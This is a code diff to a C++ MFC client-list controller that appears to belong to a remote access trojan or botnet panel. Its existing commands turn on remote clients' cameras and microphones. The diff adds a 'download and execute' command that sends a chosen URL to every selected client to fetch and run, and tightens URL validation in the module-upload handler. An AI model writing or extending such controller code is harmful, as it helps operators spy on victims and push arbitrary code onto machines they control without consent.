@@ -33,6 +33,7 @@ BEGIN_MESSAGE_MAP(CClientList, CListCtrl)
 	ON_COMMAND(ID_OPERATION_CAMERA, &CClientList::OnOperationCamera)
 	ON_COMMAND(ID_SESSION_RESTART, &CClientList::OnSessionRestart)
 	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientList::OnOperationMicrophone)
+	ON_COMMAND(ID_OPERATION_DOWNLOADANDEXEC, &CClientList::OnOperationDownloadandexec)
 END_MESSAGE_MAP()
 
 
@@ -235,7 +236,7 @@ void CClientList::OnUploadmoduleFromurl()
 	if (!pos)
 		return;
 	CUrlInputDlg dlg;
-	if (IDOK != dlg.DoModal())
+	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == NULL)
 		return;
 	while (pos)
 	{
@@ -328,5 +329,23 @@ void CClientList::OnOperationMicrophone()
 		int CurSelIdx = GetNextSelectedItem(pos);
 		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
 		pHandler->BeginMicrophone();
+	}
+}
+
+
+void CClientList::OnOperationDownloadandexec()
+{
+	// TODO:  在此添加命令处理程序代码
+	POSITION pos = GetFirstSelectedItemPosition();
+	if (!pos)
+		return;
+	CUrlInputDlg dlg;
+	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == NULL)
+		return;
+	while (pos)
+	{
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->BeginDownloadAndExec(dlg.m_Url.GetBuffer());
 	}
 }
